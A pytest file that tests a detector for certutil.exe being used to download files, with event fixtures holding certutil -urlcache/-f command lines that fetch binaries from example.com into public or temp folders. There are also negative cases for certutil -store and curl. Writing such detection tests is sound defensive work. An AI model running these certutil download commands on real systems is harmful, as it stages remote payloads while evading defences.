import importlib.util
from pathlib import Path


SCRIPT_PATH = Path("automation/detect_certutil_download.py")

spec = importlib.util.spec_from_file_location(
    "detect_certutil_download",
    SCRIPT_PATH,
)
detector = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(detector)


def test_detects_certutil_https_download() -> None:
    event = {
        "Image": r"C:\Windows\System32\certutil.exe",
        "CommandLine": (
            "certutil.exe -urlcache -split -f "
            "https://example.com/tools/sample.bin "
            r"C:\Users\Public\sample.bin"
        ),
    }

    assert detector.is_suspicious_certutil_download(event) is True


def test_detects_certutil_http_download() -> None:
    event = {
        "Image": r"C:\Windows\System32\certutil.exe",
        "CommandLine": (
            "certutil.exe -f "
            "http://example.com/file.bin "
            r"C:\Temp\file.bin"
        ),
    }

    assert detector.is_suspicious_certutil_download(event) is True


def test_ignores_normal_certutil_command() -> None:
    event = {
        "Image": r"C:\Windows\System32\certutil.exe",
        "CommandLine": "certutil.exe -store My",
    }

    assert detector.is_suspicious_certutil_download(event) is False


def test_ignores_non_certutil_download_command() -> None:
    event = {
        "Image": r"C:\Windows\System32\curl.exe",
        "CommandLine": (
            "curl.exe https://example.com/sample.bin"
        ),
    }

    assert detector.is_suspicious_certutil_download(event) is False
